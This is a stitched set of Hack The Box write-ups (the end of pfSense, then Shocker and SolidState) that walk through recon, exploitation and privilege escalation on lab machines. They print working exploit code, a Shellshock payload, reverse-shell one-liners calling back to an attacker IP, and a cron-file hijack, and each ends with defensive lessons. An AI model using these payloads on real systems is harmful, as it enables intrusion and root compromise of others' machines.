The version number is 2.1.3. If we go back to our searchsploit results, one exploit does stand out.

![](https://miro.medium.com/max/1299/1*1JawlP5h4L_nNyUrMdRGpQ.png)

## Exploitation <a id="d1d3"></a>

Transfer the exploit to our directory.

```text
searchsploit -m 43560.py
```

Let’s look at the[ exploit](https://www.exploit-db.com/exploits/43560) to see what it’s doing.

```text
.....# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
......
```

It seems that the status\_rrd\_graph\_img.php script is vulnerable to a command injection. To exploit that, the script is passing a simple python reverse shell \(with the configuration parameters we pass as arguments\) as a command. It does octal encode the reverse shell command which leads me to believe that there is either some form of filtering being done at the backend or the application crashes on certain characters. To sum up, it’s a very simple script that sends a reverse shell back to our attack machine.

Therefore, let’s up a listener to receive the shell.

```text
nc -nlvp 1234
```

Then run the exploit.

```text
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 1234 --username rohit --password pfsense
```

We have a shell!

![](https://miro.medium.com/max/735/1*HlkTLkGA2OYf6Nthu8ISUw.png)

For this machine, we don’t have to escalate privileges since pfSense is running as root and therefore when we exploited the command injection vulnerability we got a shell with root privileges.

View the user.txt and root.txt flags.

![](https://miro.medium.com/max/473/1*PjJO-DHzn0zFlKLW9TP7ew.png)

It’s worth noting that this can be easily done manually and is a good exercise for machines that don’t have scripts to automate the exploit.

## Lessons Learned <a id="29f5"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Information disclosure. The changelog.txt & system-users.txt files were publicly available to anyone that enumerates the directories on the webserver. Those files gave us information about the vulnerabilities in the web server and credential information for one of the accounts. Administrators should never publicly store sensitive information.
2. Use of default credentials. The user used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.
3. Command injection in the pfSense software that allowed us to send a shell back to our attack server. This could have been avoided if the user had patched the system and installed the most recent version of pfSense.

As mentioned earlier, we didn’t have to escalate privileges for this box since pfSense runs with root privileges and therefore we got a shell with root privileges.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
shocker-writeup-w-o-metasploit.md
# Shocker Writeup w/o Metasploit

![](https://miro.medium.com/max/587/1*IwGZZRtSA2MqDSXN3n2y2A.png)

## Reconnaissance <a id="0c77"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA htb/shocker/nmap/initial 10.10.10.56
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that two ports are open:

* **Port 80:** running Apache httpd 2.4.18
* **Port 2222**: running OpenSSH 7.2p2

![](https://miro.medium.com/max/972/1*PcNNXBpye-H5vlFeaQghfQ.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA htb/shocker/nmap/full 10.10.10.56
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/923/1*TacUWBb8bSBVsq384AXb5w.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA htb/shocker/nmap/udp 10.10.10.56
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don’t have the UDP scan results.

## Enumeration <a id="f5f0"></a>

Let’s enumerate more on the open ports.

SearchSploit does not generate any useful exploits that we can use.

```text
searchsploit --id httpd
searchsploit --id openssh 7.2p2
```

Next, visit the Apache server on the browser.

![](https://miro.medium.com/max/531/1*I00OLAoXTWHX2f27MlC60Q.png)

We get a page that does not have links to any other pages. Therefore, we’ll run Gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56
```

This leads us to another dead end. It only discovered one directory that we don’t have access to.

![](https://miro.medium.com/max/1078/1*S6OcwFwUtKpzCCoz5gZA5w.png)

Given the name of the machine, I have a suspicion that it is vulnerable to the Shellshock bash remote code execution vulnerability. This vulnerability affected web servers utilizing CGI \(Common Gateway Interface\), which is a system for generating dynamic web content. This usually involved directories such as /cgi-sys, /cgi-mod, /cgi-bin, etc. I’ll manually try them on the web server to see if they exist.

/cgi-sys and /cgi-mod do not exist on the web server. However /cgi-bin does. It was interesting to note the behaviour of the web server when I add /cgi-bin versus /cgi-bin/ to the URL path.

![](https://miro.medium.com/max/1120/1*JvOVBcuFii3gWaazQhP2pQ.png)

/cgi-bin/ gave me a 403 \(you don’t have access to this resource\) and /cgi-bin gave me a 404 \(resource not found\). It seems that if we don’t add the “/” at the end of the URL, the server is interpreting it as a file instead of a directory \(maybe, I’m not too sure\).

Now it makes sense why Gobuster did not find the directory. It checked the url “10.10.10.56/cgi-bin”, got a 404 and therefore didn’t report it. The “-f” flag appends “/” to each request. So let’s run Gobuster again.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f
```

It finds the directory!

![](https://miro.medium.com/max/1129/1*Yjq0Plgf6Qp225SB2kchcQ.png)

Now we need to enumerate more on the /cgi-bin/ directory. I’ll look for files with extensions “sh” and “cgi”.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi
```

* **-x**: file extensions to search for

![](https://miro.medium.com/max/1181/1*8T89q13HIQDm_qSH2S0Ahg.png)

I get back a bash script \(user.sh\). When I visit the URL, it prompts me to download the file.

![](https://miro.medium.com/max/536/1*QMIi7XxN5PhTCPSA-BE8KQ.png)

Opening the file shows us the following content.

![](https://miro.medium.com/max/610/1*-fW0N1kfcO3WO5GV8_nP7Q.png)

Fire up burp and intercept the request to the bash script. The send it to Repeater.

![](https://miro.medium.com/max/952/1*mOZJLz4zlo39yGYVJUiJHg.png)

The above image shows the request to the bash script and the response we get from the server. Now let’s try to see if it is vulnerable to shellshock.

## Gaining an Initial Foothold <a id="11da"></a>

I googled “shellshock reverse shell” and found this [blog](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell) explaining how to exploit the shellshock vulnerability to get a reverse shell on the system the web server is running on.

First add the following string in the User Agent field in Burp.

```text
() { ignored;};/bin/bash -i >& /dev/10.10.14.6/4444/port 0>&1
```

Then start up a listener on your attack machine using the same configuration in the above string.

```text
nc -nlvp 4444
```

Go back to Burp and execute the request.

![](https://miro.medium.com/max/826/1*R_U6_V9WN-4hZH5Qmi9Rzw.png)

Burp shouldn’t give you a response if the exploit worked. Go back to your listener and check if you got a shell back.

![](https://miro.medium.com/max/561/1*6kwwtFfspkld_ybhtoMSfA.png)

We got back a low privileged shell! Grab the user flag.

![](https://miro.medium.com/max/497/1*DZq0am-ZhF7iiZKUuDli9w.png)

It’s time to escalate privileges.

## Privilege Escalation <a id="cb6c"></a>

Run the following command to determine what permissions you have.

```text
sudo -l
```

![](https://miro.medium.com/max/889/1*v11VtaF_bxBLav44Ldqwlw.png)

Yikes, I can run perl as root! Well, it’s yay for me and yikes for the system administrator. If I use perl to send a reverse shell back to my machine it will get executed with the same privileges that perl is running in. So if I run perl with sudo privileges, I’ll get back a reverse shell with root privileges.

Go to [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and grab the perl code for a reverse shell. Don’t forget to add sudo at the beginning.

```text
sudo perl -e 'use Socket;$i="10.10.14.6";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Before you execute the code, start up a listener on your attack machine with the same configuration as the above code.

```text
nc -nlvp 1234
```

Execute the code and we have root!

![](https://miro.medium.com/max/627/1*PYbSwujwW-2slcj_OyzJJA.png)

Grab the root flag.

![](https://miro.medium.com/max/418/1*9cqlYBxat0eGud-WkxJrdw.png)

## Lessons Learned <a id="e94d"></a>

I’ve never seen or had to use the “-f” flag with Gobuster, so that was something new that I learned while solving this box. I’ll definitely keep it in mind when I solve future boxes.

As for vulnerabilities, I counted three. The first being a web server insecure misconfiguration. I wasn’t allowed to access the /cgi-bin directory but for some reason I was allowed to access the user.sh file inside of that directory. The administrator should have restricted access to all the files in the directory.

The second vulnerability is that the web server was executing bash commands on a system that was running a version of Bash that was vulnerable to the Shellshock vulnerability. This allowed us to gain initial access to the system. Of course a patch is available and the administrator should have patched his system.

The third vulnerability is insecure system configuration. You should always conform to the principle of least privilege and the concept of separation of privileges. Giving the user sudo access to run perl, allowed me \(the attacker\) to escalate privileges.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
solidstate-writeup-w-o-metasploit.md
# SolidState Writeup w/o Metasploit

![](https://miro.medium.com/max/583/1*MeYitTUrBqsreYhVAiEXJw.png)

## Reconnaissance <a id="1fb7"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.51
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 5 ports are open:

* **Port 22:** running OpenSSH 7.4p1
* **Port 25:** running JAMES smtpd 2.3.2
* **Port 80:** running httpd 2.4.25
* **Port 110:** running JAMES pop3d 2.3.2
* **Port 119:** running JAMES nntpd

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 17:22 EST
Nmap scan report for 10.10.10.51
Host is up (0.039s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/29%OT=22%CT=1%CU=39873%PV=Y%DS=2%DC=I%G=Y%TM=5E0927
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST
OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)                                                                                                                                                                        
                                                                                                                                                                               
Network Distance: 2 hops                                                                                                                                                       
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                      
                                                                                                                                                                               
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                          
Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.51
```

We get back the following result showing that one other port is open.

* **Port 4555:** running JAMES Remote Admin 2.3.2

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-29 17:26 EST
Nmap scan report for 10.10.10.51
Host is up (0.052s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.55 seconds
```

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.51
```

I managed to root the box and write this blog while the UDP scan did not terminate. So I don’t have UDP nmap scan results for this box.

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.
* Ports 25, 110, 119 and 4555 are running Apache James. Apache James is an open source SMTP and POP3 mail transfer agent and NNTP news server. Port 4555 immediately catches my eye since it’s a remote administration tool. We’ll need to run searchsploit on it to check if it is associated with any critical vulnerabilities.

## Enumeration <a id="c873"></a>

I always start off with enumerating HTTP first.

**Port 80**

Visit the application in the browser.

![](https://miro.medium.com/max/1203/1*ffkgnmV24ovMSS_Meno7uQ.png)

I visited all the pages in the application and didn’t find anything useful. Next, let’s run gobuster.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51
```

* **dir:** uses directory/file brute forcing mode
* **-w:** path to the wordlist
* **-u:** target URL or domain

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.51
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/29 17:31:19 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2019/12/29 17:56:46 Finished
===============================================================
```

Nothing useful, so let’s move on to enumerating port 4555.

**Port 4555**

Run searchsploit on the software name and version.

```text
searchsploit Apache James Server 2.3.2
```

We get back the following result.

![](https://miro.medium.com/max/1412/1*x4f2NY7NAqbl--nPVfjvcA.png)

Jackpot! Transfer the exploit to our current directory.

```text
searchsploit -m 35513
```

You should never run scripts that you haven’t reviewed first, so let’s view the content of this exploit.

```text
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```

After reviewing the script, I made a few notes:

1. This is an authenticated exploit, so we need credentials. The exploit uses the default credentials root/root that are probably shipped with the software. We’ll have to connect to the server to find out if these credentials are valid before we run this exploit.
2. When running the exploit we have to pass the IP address as an argument. The script by default connects to port 4555 which is good since our server is running on that port.
3. The script first creates a user with username “../../../../../../../../etc/bash\_completion.d” and password “exploit”. It then connects to the SMTP server and sends that user a payload. Right off the bat, this doesn’t make much sense, so we’ll have to research the vulnerability.

After a bit of research we find that the vulnerability is in the _adduser_ functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we’re creating a user with the username “../../../../../../../../etc/bash\_completion.d”, any mail that gets sent to that user will be stored in that directory path. Why is that dangerous? Long story short, anything under the directory /etc/bash\_completion.d is automatically loaded by Bash for all users! To learn more about bash completion scripts, refer to this [article](https://iridakos.com/programming/2018/03/01/bash-programmable-completion-tutorial).

Therefore, if we create a user with a username that leads to the /etc/bash\_completion.d directory, when we send an email to that user, our email gets saved in the bash\_completion.d directory and the content of our email is automatically loaded by Bash when any user logs into the machine. So if we include a reverse shell in the email, all we have to do is wait for a single user to log in and we have access to the machine!

Now that we’ve done our research, we’re ready to move on to the exploitation phase.

## Initial Foothold <a id="16ff"></a>

First, let’s test the root/root credentials on the James Remote Admin server.

```text
root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

It works, good! List the available commands using the HELP command.

```text
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Use the listusers command to display existing accounts.

```text
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We have 5 accounts. Since this is an admin account, we can set a user’s password and then access their account. If this was a real penetration test, you probably don’t want to do that. You’ll raise a lot of red flags when a bunch of users no longer can access their accounts. However, since this is a practice environment, I’m going to go all out. Let’s start by changing the mailadmin user’s account.

```text
setpassword mailadmin password
Password for mailadmin reset
```

Now that we reset the password for the mailadmin account, let’s access his email using telnet.

```text
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mailadmin
+OK
PASS password
+OK Welcome mailadmin
LIST
+OK 0 0
.
```

He does not have any mail. Next, I’m going to reset the passwords of all the other accounts.

```text
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
```

James, Thomas and John didn’t have any emails too. Mindy on the other hand had two emails stored in her account.

```text
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: WelcomeDear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.We are looking forward to you joining our team and your success at Solid State Security.Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your AccessDear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.username: mindy
pass: P@55W0rd1!2@Respectfully,
James
```

The first email was useless but the second email gives us SSH credentials! Let’s SSH into Mindy’s account.

```text
root@kali:~# ssh mindy@10.10.10.51
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

We’re in! However, we seem to be in a restricted bash shell \(rbash\). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. That’s why the “whoami” command didn’t work for us.

The “ls” and “cat” commands work, so we can at least view the user.txt flag.

![](https://miro.medium.com/max/597/1*nLY63rKrGS5cSJYalIg0rg.png)

There are several things you can do to try and break out of a restricted shell. I tried a bunch of them, but nothing worked. I’m not even allowed to change directories!

```text
mindy@solidstate:~$ cd /home
-rbash: cd: restricted
```

We seem to have reached a dead end, so let’s go back to the RCE exploit we found earlier. I’m going to exploit this manually instead of using the script on exploitdb.

Log back into the James Remote Admin server and create a user with the username “../../../../../../../../etc/bash\_completion.d” and password “password”.

```text
root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d password
User ../../../../../../../../etc/bash_completion.d added
```

Now let’s send this user an email that contains a reverse shell.

```text
root@kali:~# telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
EHLO bla.bla
250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: <'random@random.com>
250 2.1.0 Sender <'random@random.com> OK
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: bla.bla
'
/bin/nc -e /bin/bash 10.10.14.12 1234
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
```

If you’re not familiar with using telnet for SMTP communication, refer to this [guide](https://docs.microsoft.com/en-us/exchange/mail-flow/test-smtp-with-telnet?view=exchserver-2019). One thing to note is the single quote we added in the MAIL FROM field and after the FROM field. This is so that the file is interpreted properly at the backend and our reverse shell runs.

Next, set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Then SSH into Mindy’s account so that the content of the bash\_completion directory is loaded.

```text
ssh mindy@10.10.10.51
```

We get a shell that’s no longer restricted by the rbash shell!

![](https://miro.medium.com/max/759/1*-g9cs4Y3RIcMG88e3yREnQ.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Now we need to escalate privileges.

## Privilege Escalation <a id="866e"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We don’t get anything useful. Next, let’s try pspy. If you don’t have the script, you can download it from the following github repository.

```text
https://github.com/DominicBreuker/pspy
```

We know that the system is a 32 bit system so make sure you run pspy32. Upload it and run it on the attack machine in the same way we did for LinEnum.

After a minute we see an interesting process pop up.

![](https://miro.medium.com/max/943/1*Xz8gUedVbeUPuZEP-wmVHg.png)

If you view the permissions on the /opt/tmp.py file, you’ll see that everyone has read/write/execute privileges on it.

![](https://miro.medium.com/max/961/1*DIhulL7pCEZPfrsVwUe24w.png)

Therefore all we need to do is change the content of the file to send a reverse shell to our attack machine and then we simply wait for the cron job to send a privileged shell back.

Change the content of the file to send a reverse shell to our attack machine.

```text
echo "os.system('/bin/nc -e /bin/bash 10.10.14.12 7777')" >> /opt/tmp.py
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 7777
```

Wait a minute for the cron job to run.

![](https://miro.medium.com/max/808/1*ynxb5W6Wt8xB3sPlZDYZRg.png)

We have a shell! Grab the root.txt flag.

![](https://miro.medium.com/max/672/1*YCIcKSYTe77zalgSqIfAag.png)

## Lessons Learned <a id="f59a"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.
2. Information disclosure. SSH credentials are stored in plaintext in one of the user’s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login.
3. A Remote Code Execution \(RCE\) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software.

To escalate privileges we exploited one vulnerability.

1. A security misconfiguration of file permissions. There was a scheduled task that ran a file with root privileges although everyone had write access to that file. This allowed us to change the content of the file and get a privileged reverse shell sent back to our attack machine. To avoid this vulnerability, the file permissions should have been restricted to only root level access.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
sunday-writeup-w-o-metasploit.md
